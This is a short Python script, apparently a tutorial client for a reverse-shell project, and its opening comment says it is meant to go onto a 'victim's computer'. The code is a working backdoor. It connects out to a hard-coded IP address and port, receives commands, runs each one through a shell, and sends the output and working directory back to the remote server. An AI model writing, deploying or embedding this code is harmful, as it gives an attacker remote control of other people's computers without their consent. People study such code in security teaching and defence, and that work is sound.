##### Attrey Bhatt Codes - https://github.com/attreyabhatt/Reverse-Shell ###########
# Suppose we are hacker then this client file will go into victims computer

#importing socket so that we can connect two computer
import socket
#Blow 2 imports are important because without them we wont be able to execute
#the instructions that the client.py file is going to recieve
import os         #os stands for operating system
import subprocess #Subprocesses is a process that exist on a windows computer

s = socket.socket()
host = '162.168.10.105'  #IP Address of the server
port = 9999            #Must be same as that in server.py

#In client.py we use another way to bind host and port together
s.connect((host, port))

while True:
    #To recieve data from the server and saving it in data
    data = s.recv(1024)
    #Checking whether first two char of data is "cd" or not
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        #Popen will open up terminal 
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))

        print(output_str)
